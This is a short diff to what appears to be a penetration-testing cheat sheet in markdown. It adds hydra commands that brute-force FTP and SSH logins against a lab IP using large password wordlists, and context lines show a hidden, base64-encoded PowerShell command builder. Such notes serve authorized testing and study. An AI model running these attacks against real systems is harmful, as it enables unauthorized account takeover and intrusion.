@@ -115,6 +115,18 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 return cmd
 ```
 
+
+
+## Brute Forcing Password
+
+```sh
+hydra -I -V -f -L usernames.txt -u -P /opt/SecLists/Passwords/xato-net-10-million-passwords.txt 192.168.191.46 ftp
+```
+
+```bash
+hydra -I -V -f -L usernames.txt -u -P /usr/share/wordlists/rockyou.txt ssh://ip
+```
+
 ## Cracking
 
 ### KeePass
